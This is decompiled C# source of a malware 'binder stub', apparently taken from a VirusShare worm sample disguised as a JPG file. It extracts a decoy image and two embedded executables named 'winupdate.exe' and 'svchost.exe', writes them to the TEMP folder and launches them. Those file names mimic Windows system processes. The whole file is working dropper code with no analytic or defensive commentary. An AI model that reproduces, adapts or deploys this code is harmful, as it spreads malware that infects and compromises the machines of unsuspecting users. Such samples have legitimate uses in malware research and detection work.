// Decompiled with JetBrains decompiler
// Type: Fjux_binder_Stub.Program
// Assembly: Copy of 011.jpg, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 54BE1F26-7B37-4854-8B6D-10F89C8997F0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.Win32.VBNA.b-ebb52e89df8d9da7761120d2a2e946f4d2bc0d037bea99f7359c3b166ff11dde.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Fjux_binder_Stub
{
  internal class Program
  {
    private static List<Process> Procs = new List<Process>();

    private static void Main(string[] args)
    {
      Console.ReadLine();
      Program program = new Program();
      foreach (Proccesinfo fileInfo in program.CreateFileInfos())
      {
        program.WriteFile(fileInfo);
        program.RunFile(fileInfo);
      }
      foreach (Process proc in Program.Procs)
        proc.WaitForExit();
    }

    private List<Proccesinfo> CreateFileInfos()
    {
      List<Proccesinfo> fileInfos = new List<Proccesinfo>();
      Stream manifestResourceStream1 = Assembly.GetExecutingAssembly().GetManifestResourceStream("Copy of 011.jpg");
      byte[] numArray1 = new byte[manifestResourceStream1.Length];
      manifestResourceStream1.Read(numArray1, 0, numArray1.Length);
      manifestResourceStream1.Close();
      fileInfos.Add(new Proccesinfo(numArray1, "Copy of 011.jpg", false, false, false));
      Stream manifestResourceStream2 = Assembly.GetExecutingAssembly().GetManifestResourceStream("winupdate.exe");
      byte[] numArray2 = new byte[manifestResourceStream2.Length];
      manifestResourceStream2.Read(numArray2, 0, numArray2.Length);
      manifestResourceStream2.Close();
      fileInfos.Add(new Proccesinfo(numArray2, "winupdate.exe", false, false, false));
      Stream manifestResourceStream3 = Assembly.GetExecutingAssembly().GetManifestResourceStream("svchost.exe");
      byte[] numArray3 = new byte[manifestResourceStream3.Length];
      manifestResourceStream3.Read(numArray3, 0, numArray3.Length);
      manifestResourceStream3.Close();
      fileInfos.Add(new Proccesinfo(numArray3, "svchost.exe", false, false, false));
      return fileInfos;
    }

    private void WriteFile(Proccesinfo fileInfo)
    {
      FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\" + fileInfo.FileName, FileMode.Create);
      fileStream.Write(fileInfo.FileBytes, 0, fileInfo.FileBytes.Length);
      fileStream.Close();
      fileStream.Dispose();
    }

    private void RunFile(Proccesinfo fileInfo)
    {
      ProcessStartInfo processStartInfo = new ProcessStartInfo();
      if (fileInfo.NoWindow)
        processStartInfo.CreateNoWindow = true;
      if (fileInfo.Hidden)
        processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      processStartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + fileInfo.FileName;
      Process process = new Process();
      process.StartInfo = processStartInfo;
      process.Start();
      Program.Procs.Add(process);
      if (!fileInfo.WaitFor)
        return;
      process.WaitForExit();
    }
  }
}
